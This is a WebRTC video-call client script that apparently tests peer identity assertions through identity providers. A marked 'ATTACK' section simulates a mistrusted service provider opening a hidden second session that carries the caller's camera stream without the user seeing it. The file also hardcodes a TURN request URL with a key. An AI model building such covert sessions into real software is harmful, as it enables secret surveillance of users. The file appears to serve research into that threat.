'use strict';

var isChannelReady = true;
var isInitiator = false;
var isStarted = false;
var localStream;
var pc;
var remoteStream;
var turnReady;

var pc_config = {'iceServers': [{'url': 'stun:stun.l.google.com:19302'}]};

var pc_constraints = {'optional': [{'DtlsSrtpKeyAgreement': true}]};

// Set up audio and video regardless of what devices are present.
var sdpConstraints = {'mandatory': {
  'OfferToReceiveAudio':true,
  'OfferToReceiveVideo':true }};

/////////////////////////////////////////////

var room = location.pathname.substring(1);
if (room === '') {
//  room = prompt('Enter room name:');
  room = 'foo';
} else {
  //
}
//
//var socket = io.connect();

if (room !== '') {
  console.log('Create or join room', room);
  socket.emit('create or join', room);
}

socket.on('created', function (room){
  console.log('Created room ' + room);
  //isInitiator = true;
});

socket.on('full', function (room){
  console.log('Room ' + room + ' is full');
});

socket.on('join', function (room){
  console.log('Another peer made a request to join room ' + room);
  console.log('This peer is the initiator of room ' + room + '!');
  isChannelReady = true;
});

socket.on('joined', function (room){
  console.log('This peer has joined room ' + room);
  isChannelReady = true;
});

socket.on('log', function (array){
  console.log.apply(console, array);
});

////////////////////////////////////////////////
//				    GUI CMD                   //
////////////////////////////////////////////////
function startUserMedia(){
	var constraints = {video: true};
	getUserMedia(constraints, handleUserMedia, handleUserMediaError);
	console.log('Getting user media with constraints', constraints);
}

function callWebRTC(){
	isInitiator = true
    startWebRTC()
}

function startWebRTC() {
  if (!isStarted && typeof localStream != 'undefined' && isChannelReady) {
    createPeerConnection();
    pc.addStream(localStream);
    pc.setIdentityProvider("kcorre.github.io", "WebID-proxy.js")
	//pc.setIdentityProvider("energyq.idp.rethink.orange-labs.fr", "rethink-oidc");
//	pc.setIdentityProvider("niif.hu", "idp.html");
	console.log("asking id assert")
	pc.getIdentityAssertion();
    console.log("done")
	isStarted = true;
    if (isInitiator) {
      doCall();
    }
  } else if(attackMode){
	  createPeerConnection()
	  pc.addStream(localStream)
  }
}

////////////////////////////////////////////////
//				WEBRTC CONTROL				  //
////////////////////////////////////////////////
function sendMessage(message){
	console.log('Client sending message: ', message);
	if(attackMode){
		console.log("attack mode")
		socket.emit('webrtc_attack', message);
	} else {
	socket.emit('webrtc_signal', message);
	}
}

socket.on('webrtc_signal', function (message){
  
  console.log('Client received message:', message);
  if (message.type === 'offer') {
    if (!isInitiator && !isStarted) {
      	startWebRTC();

      	pc.peerIdentity
            	    .catch(err => {
            	        console.log('peerIdentity catched')
            	        console.log(err)
            	        console.log(pc.peerIdentity)
            	    })
            	    .then(id => {
            	        console.log('peerIdentity completed')
            	        console.log(id)
            	        console.log(pc.peerIdentity)
            	    })


    	pc.setRemoteDescription(new RTCSessionDescription(message))
    	.catch(err => console.log("Promise err"+err))
    	.then(res => {
    	    console.log("Promise concluded "+res)
    	    console.log(pc)
    	    console.log(pc.peerIdentity)
    	    doAnswer()
    	})
	}
  } else if (message.type === 'answer' && isStarted) {
    pc.setRemoteDescription(new RTCSessionDescription(message));
  } else if (message.type === 'candidate' && isStarted) {
    var candidate = new RTCIceCandidate({
      sdpMLineIndex: message.label,
      candidate: message.candidate
    });
    pc.addIceCandidate(candidate);
  } else if (message === 'bye' && isStarted) {
    handleRemoteHangup();
  }
});


////////////////////////////////////////////////
//				     ATTACK					  //
////////////////////////////////////////////////
var pcAttack = null
var attackMode = false
var aux
// Attack from mistrusted com service provider
// The com service provider open a new WebRTC session behind users back
socket.on('webrtc_attack', function(message){
	console.log("received Attack")
	//Listen to Alice (initiator)
	if(isInitiator){
		
	    console.log('Client received message:', message);
	    if (message.type === 'offer') {
			attackMode = true
			//Switch to attack mode
			aux = pc
			pc = pcAttack
	      startWebRTC();
		  console.log("created attack "+pc)
	      pc.setRemoteDescription(new RTCSessionDescription(message));
	      doAnswer();
	    } else if (message.type === 'answer') {
	      pc.setRemoteDescription(new RTCSessionDescription(message));
	    } else if (message.type === 'candidate') {
	      var candidate = new RTCIceCandidate({
	        sdpMLineIndex: message.label,
	        candidate: message.candidate
	      });
	      pc.addIceCandidate(candidate);
	    } else if (message === 'bye') {
	      pc.close()
		  pc = null
	    } else if (message === 'thanks') {
			// Revert to normal mode
			//Save pcAttack
			pcAttack = pc
			pc = aux
			attackMode = false
	    }

	}
});

////////////////////////////////////////////////////
//					USER MEDIA					  //
////////////////////////////////////////////////////
var localVideo = document.querySelector('#localVideo');
var remoteVideo = document.querySelector('#remoteVideo');

function handleUserMedia(stream) {
  console.log('Adding local stream.');
  localVideo.src = window.URL.createObjectURL(stream);
  localStream = stream;
}

function handleUserMediaError(error){
  console.log('getUserMedia error: ', error);
}


if (location.hostname != "localhost") {
  requestTurn('https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913');
}

window.onbeforeunload = function(e){
	sendMessage('bye');
}

/////////////////////////////////////////////////////////
//						WEBRTC						   //
/////////////////////////////////////////////////////////
function createPeerConnection() {
  try {
    pc = new RTCPeerConnection(null);
    pc.onicecandidate = handleIceCandidate;
    pc.onaddstream = handleRemoteStreamAdded;
    pc.onremovestream = handleRemoteStreamRemoved;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
      return;
  }
}

function handleIceCandidate(event) {
  console.log('handleIceCandidate event: ', event);
  if (event.candidate) {
    sendMessage({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate});
  } else {
    console.log('End of candidates.');
  }
}

function handleRemoteStreamAdded(event) {
	console.log('Add remote stream in attackMode'+attackMode==true)
	if(!attackMode){
		console.log('Remote stream added.');
		remoteVideo.src = window.URL.createObjectURL(event.stream);
		remoteStream = event.stream;
	}
	else{
		console.log('Dont add stream')
	}
}

function handleCreateOfferError(event){
  console.log('createOffer() error: ', event);
}

function doCall() {
  console.log('Sending offer to peer');
  pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
}

function doAnswer() {
  console.log('Sending answer to peer.');
  pc.createAnswer(setLocalAndSendMessage, RTCPeerConnectionErrorCallback, sdpConstraints);
}

function RTCPeerConnectionErrorCallback(err){
  console.log('RTCPeerConnection error '+err);
}

function setLocalAndSendMessage(sessionDescription) {
  // Set Opus as the preferred codec in SDP if Opus is present.
  sessionDescription.sdp = preferOpus(sessionDescription.sdp);
  pc.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message' , sessionDescription);
  sendMessage(sessionDescription);
}

function requestTurn(turn_url) {
  var turnExists = false;
  for (var i in pc_config.iceServers) {
    if (pc_config.iceServers[i].url.substr(0, 5) === 'turn:') {
      turnExists = true;
      turnReady = true;
      break;
    }
  }
  if (!turnExists) {
    console.log('Getting TURN server from ', turn_url);
    // No TURN server. Get one from computeengineondemand.appspot.com:
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function(){
      if (xhr.readyState === 4 && xhr.status === 200) {
        var turnServer = JSON.parse(xhr.responseText);
      	console.log('Got TURN server: ', turnServer);
        pc_config.iceServers.push({
          'url': 'turn:' + turnServer.username + '@' + turnServer.turn,
          'credential': turnServer.password
        });
        turnReady = true;
      }
    };
    xhr.open('GET', turn_url, true);
    xhr.send();
  }
}

function handleRemoteStreamRemoved(event) {
  console.log('Remote stream removed. Event: ', event);
}

function hangup() {
  console.log('Hanging up.');
  stop();
  sendMessage('bye');
}

function handleRemoteHangup() {
	console.log('Session terminated.');
	stop();
}

function stop() {
  isStarted = false;
  isInitiator = false;
  // isAudioMuted = false;
  // isVideoMuted = false;
  pc.close();
  pc = null;
}

///////////////////////////////////////////

// Set Opus as the default audio codec if it's present.
function preferOpus(sdp) {
  var sdpLines = sdp.split('\r\n');
  var mLineIndex;
  // Search for m line.
  for (var i = 0; i < sdpLines.length; i++) {
      if (sdpLines[i].search('m=audio') !== -1) {
        mLineIndex = i;
        break;
      }
  }
  if (!mLineIndex) {
    return sdp;
  }
  console.log('sdlLines '+sdpLines);
  console.log('sdlLines length '+sdpLines.length);
  console.log('mLineIndex '+mLineIndex=== null);

  // If Opus is available, set it as the default in m line.
  for (i = 0; i < sdpLines.length; i++) {
    if (sdpLines[i].search('opus/48000') !== -1) {
      var opusPayload = extractSdp(sdpLines[i], /:(\d+) opus\/48000/i);
      if (opusPayload) {
        sdpLines[mLineIndex] = setDefaultCodec(sdpLines[mLineIndex], opusPayload);
      }
      break;
    }
  }

  // Remove CN in m line and sdp.
  sdpLines = removeCN(sdpLines, mLineIndex);

  sdp = sdpLines.join('\r\n');
  return sdp;
}

function extractSdp(sdpLine, pattern) {
  var result = sdpLine.match(pattern);
  return result && result.length === 2 ? result[1] : null;
}

// Set the selected codec to the first in m line.
function setDefaultCodec(mLine, payload) {
  var elements = mLine.split(' ');
  var newLine = [];
  var index = 0;
  for (var i = 0; i < elements.length; i++) {
    if (index === 3) { // Format of media starts from the fourth.
      newLine[index++] = payload; // Put target payload to the first.
    }
    if (elements[i] !== payload) {
      newLine[index++] = elements[i];
    }
  }
  return newLine.join(' ');
}

// Strip CN from sdp before CN constraints is ready.
function removeCN(sdpLines, mLineIndex) {
  var mLineElements = sdpLines[mLineIndex].split(' ');
  // Scan from end for the convenience of removing an item.
  for (var i = sdpLines.length-1; i >= 0; i--) {
    var payload = extractSdp(sdpLines[i], /a=rtpmap:(\d+) CN\/\d+/i);
    if (payload) {
      var cnPos = mLineElements.indexOf(payload);
      if (cnPos !== -1) {
        // Remove CN payload from m line.
        mLineElements.splice(cnPos, 1);
      }
      // Remove CN line in sdp
      sdpLines.splice(i, 1);
    }
  }

  sdpLines[mLineIndex] = mLineElements.join(' ');
  return sdpLines;
}

